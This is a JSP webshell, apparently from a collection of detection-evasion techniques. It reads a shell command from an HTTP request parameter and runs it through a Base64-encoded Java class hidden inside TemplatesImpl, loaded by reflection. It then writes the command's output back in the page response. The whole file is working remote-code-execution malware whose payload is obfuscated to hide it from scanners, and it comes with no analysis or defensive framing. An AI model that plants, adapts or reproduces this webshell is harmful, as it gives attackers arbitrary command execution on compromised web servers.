<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" %>
<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileInputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="sun.misc.IOUtils" %>
<%@ page import="sun.reflect.misc.FieldUtil" %>
<html>
<body>
<h2>利用TemplatesImpl触发的JSP Webshell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
    String outputFile = tmp + File.separator + "jfkdjkadnkladmknjknfkjnadkad.txt";
    String s = request.getParameter("threedr3am");
    if (Files.exists(Paths.get(inputFile)))
        Files.delete(Paths.get(inputFile));
    Files.write(Paths.get(inputFile), s.getBytes());

    TemplatesImpl t = new TemplatesImpl();
    Field field = FieldUtil.getDeclaredFields(t.getClass())[4];
    byte[][] bytes = new byte[1][];
    bytes[0] = Base64.getDecoder().decode("yv66vgAAADQAjwoAJgA5CAA6CgA7ADwHAD0KAAQAOQoABAA+CQA/AEAIAEEKAAQAQggAQwoARABFBwBGCgBHAEgKAEkASgoADABLCABMCABNCgAMAE4IAE8KAAwAUAoARABRCgBSAFMHAFQHAFUKABgAVgoAFwBXCgAXAFgIAFkHAFoKAEkAWwoASQBcCgAMAF0HAF4KAEkAXwcAYAoAIwBhBwBiBwBjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAGIHAEYHAGQHAD0HAFQHAGABAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwBlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABJUaHJlZWRyM2FtXzExLmphdmEMACcAKAEADmphdmEuaW8udG1wZGlyBwBmDABnAGgBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAaQBqBwBrDABsAG0BAANjbWQMAG4AbwEABnJlc3VsdAcAcAwAcQByAQAQamF2YS9sYW5nL1N0cmluZwcAcwwAdAB1BwB2DAB3AHgMACcAeQEAASUBAAAMAHoAewEAASAMAHwAfQwAfgB/BwCADACBAIIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAJwCDDAAnAIQMAIUAbwEAAQoBABhqYXZhL25pby9maWxlL0xpbmtPcHRpb24MAIYAhwwAiACJDACKAIsBABhqYXZhL25pby9maWxlL09wZW5PcHRpb24MAIwAjQEAE2phdmEvbGFuZy9UaHJvd2FibGUMAI4AKAEADVRocmVlZHIzYW1fMTEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAE2phdmEvbmlvL2ZpbGUvUGF0aHMBAANnZXQBADsoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAxyZWFkQWxsQnl0ZXMBABgoTGphdmEvbmlvL2ZpbGUvUGF0aDspW0IBAAUoW0IpVgEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZleGlzdHMBADIoTGphdmEvbmlvL2ZpbGUvUGF0aDtbTGphdmEvbmlvL2ZpbGUvTGlua09wdGlvbjspWgEABmRlbGV0ZQEAFyhMamF2YS9uaW8vZmlsZS9QYXRoOylWAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFd3JpdGUBAEcoTGphdmEvbmlvL2ZpbGUvUGF0aDtbQltMamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAD3ByaW50U3RhY2tUcmFjZQAhACUAJgAAAAAAAwABACcAKAABACkAAAFwAAUACAAAANsqtwABEgK4AANMuwAEWbcABSu2AAayAAe2AAYSCLYABrYACU27AARZtwAFK7YABrIAB7YABhIKtgAGtgAJTrgAC7sADFksA70ADLgADbgADrcADxIQEhG2ABISE7YAFLYAFbYAFjoEuwAEWbcABToFuwAXWbsAGFkZBLcAGbcAGjoGGQa2ABtZOgfGABMZBRkHtgAGEhy2AAZXp//oLQO9AAy4AA0DvQAduAAemQAOLQO9AAy4AA24AB8tA70ADLgADRkFtgAJtgAgA70AIbgAIlenAAhMK7YAJLEAAQAEANIA1QAjAAIAKgAAAEIAEAAAABIABAAUAAoAFQAkABYAPgAYAGcAGQBwABoAggAcAI0AHQCdAB8ArwAgALoAIQDSACQA1QAiANYAIwDaACUAKwAAADMABf8AggAHBwAsBwAtBwAtBwAtBwAuBwAvBwAwAAD8ABoHAC0c/wAaAAEHACwAAQcAMQQAAQAyADMAAgApAAAAGQAAAAMAAAABsQAAAAEAKgAAAAYAAQAAACoANAAAAAQAAQA1AAEAMgA2AAIAKQAAABkAAAAEAAAAAbEAAAABACoAAAAGAAEAAAAwADQAAAAEAAEANQABADcAAAACADg=");
    field.setAccessible(true);
    field.set(t, bytes);

    Field field2 = FieldUtil.getDeclaredFields(t.getClass())[12];
    field2.setAccessible(true);
    field2.set(t, TransformerFactoryImpl.newInstance());

    Field field3 = FieldUtil.getDeclaredFields(t.getClass())[3];
    field3.setAccessible(true);
    field3.set(t, "threedr3am");

    Field field4 = FieldUtil.getDeclaredFields(t.getClass())[7];
    field4.setAccessible(true);
    field4.set(t, new HashMap<>());

    try {
        t.getOutputProperties();
    } catch (Exception e) {}

    String resutl = new String(IOUtils.readFully(new FileInputStream(new File(outputFile)), -1, true));
    response.getOutputStream().write(resutl.getBytes());
%>
</body>
</html>